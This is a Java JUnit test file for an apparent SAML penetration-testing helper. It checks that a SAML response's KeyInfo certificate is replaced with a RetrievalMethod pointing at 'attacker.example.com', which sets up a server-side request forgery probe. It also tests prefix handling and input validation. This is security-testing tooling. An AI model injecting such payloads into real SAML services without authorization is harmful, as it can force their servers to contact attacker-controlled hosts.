package helpers;

import org.junit.jupiter.api.Test;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.NodeList;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertThrows;

public class KeyInfoSSRFTest {

    private static final String SAML = """
            <?xml version="1.0" encoding="UTF-8"?>
            <samlp:Response xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="r1">
              <saml:Assertion ID="a1">
                <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
                  <ds:SignedInfo>
                    <ds:Reference URI="#a1">
                      <ds:DigestValue>ABC=</ds:DigestValue>
                    </ds:Reference>
                  </ds:SignedInfo>
                  <ds:SignatureValue>SIG</ds:SignatureValue>
                  <ds:KeyInfo>
                    <ds:X509Data>
                      <ds:X509Certificate>MIIDUMMY</ds:X509Certificate>
                    </ds:X509Data>
                  </ds:KeyInfo>
                </ds:Signature>
              </saml:Assertion>
            </samlp:Response>
            """;

    @Test
    void replacesKeyInfoChildrenWithRetrievalMethod() throws Exception {
        String url = "https://attacker.example.com/key.pem";
        String out = KeyInfoSSRF.apply(SAML, url);
        Document doc = new XMLHelpers().getXMLDocumentOfSAMLMessage(out);

        NodeList keyInfos = doc.getElementsByTagNameNS("*", "KeyInfo");
        assertEquals(1, keyInfos.getLength());
        Element keyInfo = (Element) keyInfos.item(0);

        // Original X509Data must be gone
        assertEquals(0, keyInfo.getElementsByTagNameNS("*", "X509Data").getLength(),
                "X509Data should have been removed");
        assertEquals(0, keyInfo.getElementsByTagNameNS("*", "X509Certificate").getLength(),
                "X509Certificate should have been removed");

        // RetrievalMethod must be present and pointing at the attacker URL
        NodeList rms = keyInfo.getElementsByTagNameNS("*", "RetrievalMethod");
        assertEquals(1, rms.getLength());
        Element rm = (Element) rms.item(0);
        assertEquals(url, rm.getAttribute("URI"));
        assertEquals("http://www.w3.org/2000/09/xmldsig#X509Data", rm.getAttribute("Type"));
        assertEquals("http://www.w3.org/2000/09/xmldsig#", rm.getNamespaceURI(),
                "RetrievalMethod must be in the dsig namespace");
    }

    @Test
    void preservesExistingDsPrefix() throws Exception {
        String out = KeyInfoSSRF.apply(SAML, "https://a/");
        Document doc = new XMLHelpers().getXMLDocumentOfSAMLMessage(out);
        Element rm = (Element) doc.getElementsByTagNameNS("*", "RetrievalMethod").item(0);
        assertNotNull(rm);
        // The fixture uses "ds" for the signature namespace on KeyInfo.
        assertEquals("ds", rm.getPrefix(),
                "RetrievalMethod should inherit the 'ds' prefix from the KeyInfo element");
    }

    @Test
    void throwsWhenKeyInfoMissing() {
        String noKeyInfo = """
                <?xml version="1.0" encoding="UTF-8"?>
                <samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="r1"/>
                """;
        assertThrows(IllegalArgumentException.class,
                () -> KeyInfoSSRF.apply(noKeyInfo, "https://a/"));
    }

    @Test
    void throwsWhenUrlEmpty() {
        assertThrows(IllegalArgumentException.class, () -> KeyInfoSSRF.apply(SAML, ""));
        assertThrows(IllegalArgumentException.class, () -> KeyInfoSSRF.apply(SAML, "   "));
        assertThrows(IllegalArgumentException.class, () -> KeyInfoSSRF.apply(SAML, null));
    }
}
